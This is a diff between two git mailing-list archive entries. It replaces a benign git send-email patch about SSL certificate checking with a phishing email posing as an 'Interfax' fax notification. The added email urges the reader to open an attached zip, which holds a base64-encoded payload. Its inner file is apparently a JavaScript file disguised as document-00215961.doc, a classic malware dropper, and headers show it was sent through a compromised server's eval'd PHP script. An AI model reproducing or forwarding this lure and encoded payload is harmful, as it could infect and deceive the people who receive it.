@@ -1,71 +1,99 @@
-From: John Keeping <john@keeping.me.uk>
-Subject: [RFC/PATCH] send-email: die if CA path doesn't exist
-Date: Tue, 17 Nov 2015 22:12:07 +0000
-Message-ID: <27f354a4edb166e42006b0c1f778827a3dfd58ac.1447798206.git.john@keeping.me.uk>
-Cc: John Keeping <john@keeping.me.uk>
+From: "Interfax Service" <incoming@interfax.net>
+Subject: You have 1 new fax, document 00215961
+Date: Wed, 18 Nov 2015 03:33:57 +0000
+Message-ID: <ad488a24aee732735a98715c98a721e6@ericbrouet.fr>
+Reply-To: "Interfax Service" <incoming@interfax.net>
+Mime-Version: 1.0
+Content-Type: multipart/mixed;
+	boundary="b1_bab8e63a026a827174eb86d35e8ba7cf"
+Content-Transfer-Encoding: 8bit
 To: git@vger.kernel.org
-X-From: git-owner@vger.kernel.org Wed Nov 18 03:24:07 2015
+X-From: git-owner@vger.kernel.org Wed Nov 18 04:43:11 2015
 Return-path: <git-owner@vger.kernel.org>
 Envelope-to: gcvg-git-2@plane.gmane.org
 Received: from vger.kernel.org ([209.132.180.67])
 	by plane.gmane.org with esmtp (Exim 4.69)
 	(envelope-from <git-owner@vger.kernel.org>)
-	id 1ZysPm-0001Rl-Sc
-	for gcvg-git-2@plane.gmane.org; Wed, 18 Nov 2015 03:24:07 +0100
+	id 1ZyteI-0004g1-I8
+	for gcvg-git-2@plane.gmane.org; Wed, 18 Nov 2015 04:43:10 +0100
 Received: (majordomo@vger.kernel.org) by vger.kernel.org via listexpand
-	id S1752420AbbKRCYA (ORCPT <rfc822;gcvg-git-2@m.gmane.org>);
-	Tue, 17 Nov 2015 21:24:00 -0500
-Received: from jackal.aluminati.org ([72.9.247.210]:33413 "EHLO
-	jackal.aluminati.org" rhost-flags-OK-OK-OK-OK) by vger.kernel.org
-	with ESMTP id S1751746AbbKRCX7 (ORCPT <rfc822;git@vger.kernel.org>);
-	Tue, 17 Nov 2015 21:23:59 -0500
-Received: from localhost (localhost [127.0.0.1])
-	by jackal.aluminati.org (Postfix) with ESMTP id 1491F9624C9;
-	Wed, 18 Nov 2015 00:14:02 +0000 (GMT)
-X-Quarantine-ID: <CDbRDkIpvzCB>
-X-Virus-Scanned: Debian amavisd-new at serval.aluminati.org
-X-Spam-Flag: NO
-X-Spam-Score: -0.199
-X-Spam-Level: 
-X-Spam-Status: No, score=-0.199 tagged_above=-9999 required=6.31
-	tests=[ALL_TRUSTED=-1, BAYES_50=0.8, URIBL_BLOCKED=0.001] autolearn=no
-Received: from jackal.aluminati.org ([127.0.0.1])
-	by localhost (jackal.aluminati.org [127.0.0.1]) (amavisd-new, port 10026)
-	with ESMTP id CDbRDkIpvzCB; Wed, 18 Nov 2015 00:14:00 +0000 (GMT)
-Received: from river.lan (chimera.aluminati.org [10.0.16.60])
-	(using TLSv1 with cipher AES128-SHA (128/128 bits))
-	(No client certificate requested)
-	by jackal.aluminati.org (Postfix) with ESMTPSA id 5D00E86A292;
-	Tue, 17 Nov 2015 22:12:20 +0000 (GMT)
-X-Mailer: git-send-email 2.6.3.462.gbe2c914
+	id S1754281AbbKRDnG (ORCPT <rfc822;gcvg-git-2@m.gmane.org>);
+	Tue, 17 Nov 2015 22:43:06 -0500
+Received: from servmaster1.thinkup.fr ([176.31.106.128]:36165 "EHLO
+	servmaster1.thinkup.fr" rhost-flags-OK-OK-OK-OK) by vger.kernel.org
+	with ESMTP id S1752420AbbKRDnF (ORCPT <rfc822;git@vger.kernel.org>);
+	Tue, 17 Nov 2015 22:43:05 -0500
+X-Greylist: delayed 561 seconds by postgrey-1.27 at vger.kernel.org; Tue, 17 Nov 2015 22:43:04 EST
+Received: from localhost (localhost.localdomain [127.0.0.1])
+	by servmaster1.thinkup.fr (Postfix) with ESMTP id 0E4114007EDC
+	for <git@vger.kernel.org>; Wed, 18 Nov 2015 04:34:01 +0100 (CET)
+X-Virus-Scanned: Debian amavisd-new at ns392662.ip-176-31-106.eu
+Received: from servmaster1.thinkup.fr ([127.0.0.1])
+	by localhost (servmaster1.thinkup.fr [127.0.0.1]) (amavisd-new, port 10024)
+	with ESMTP id hfdvS35PHbtT for <git@vger.kernel.org>;
+	Wed, 18 Nov 2015 04:34:00 +0100 (CET)
+Received: by servmaster1.thinkup.fr (Postfix, from userid 10016)
+	id 85DB44007ED5; Wed, 18 Nov 2015 04:33:57 +0100 (CET)
+X-PHP-Originating-Script: 10016:post.php(4) : regexp code(1) : eval()'d code(17) : eval()'d code
+X-Priority: 3
 Sender: git-owner@vger.kernel.org
 Precedence: bulk
 List-ID: <git.vger.kernel.org>
 X-Mailing-List: git@vger.kernel.org
-Archived-At: <http://permalink.gmane.org/gmane.comp.version-control.git/281438>
+Archived-At: <http://permalink.gmane.org/gmane.comp.version-control.git/281439>
 
-If the CA path isn't found it's most likely to indicate a
-misconfiguration, in which case accepting any certificate is unlikely to
-be the correct thing to do.
+--b1_bab8e63a026a827174eb86d35e8ba7cf
+Content-Type: text/plain; charset=us-ascii
 
-Signed-off-by: John Keeping <john@keeping.me.uk>
----
- git-send-email.perl | 3 +--
- 1 file changed, 1 insertion(+), 2 deletions(-)
+You have received a new fax.
 
-diff --git a/git-send-email.perl b/git-send-email.perl
-index 8e4c0e1..e057051 100755
---- a/git-send-email.perl
-+++ b/git-send-email.perl
-@@ -1196,8 +1196,7 @@ sub ssl_verify_params {
- 		return (SSL_verify_mode => SSL_VERIFY_PEER(),
- 			SSL_ca_file => $smtp_ssl_cert_path);
- 	} else {
--		print STDERR "Not using SSL_VERIFY_PEER because the CA path does not exist.\n";
--		return (SSL_verify_mode => SSL_VERIFY_NONE());
-+		die "CA path does not exist.";
- 	}
- }
- 
--- 
-2.6.3.462.gbe2c914
+Please download attached fax document.
+
+File size:       232 Kb
+Scan duration:   17 seconds
+Scan quality:    300 DPI
+Sender:          Luis Bond
+Scanned:         Wed, 18 Nov 2015 02:21:54 +0300
+File name:       document-00215961.doc
+Number of pages: 7
+
+Thanks for choosing Interfax!
+
+
+--b1_bab8e63a026a827174eb86d35e8ba7cf
+Content-Type: application/zip; name="document-00215961.zip"
+Content-Transfer-Encoding: base64
+Content-Disposition: attachment; filename=document-00215961.zip
+
+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
+c1BLBQYAAAAAAQABAEYAAAD3BQAAAAA=
+
+
+--b1_bab8e63a026a827174eb86d35e8ba7cf--
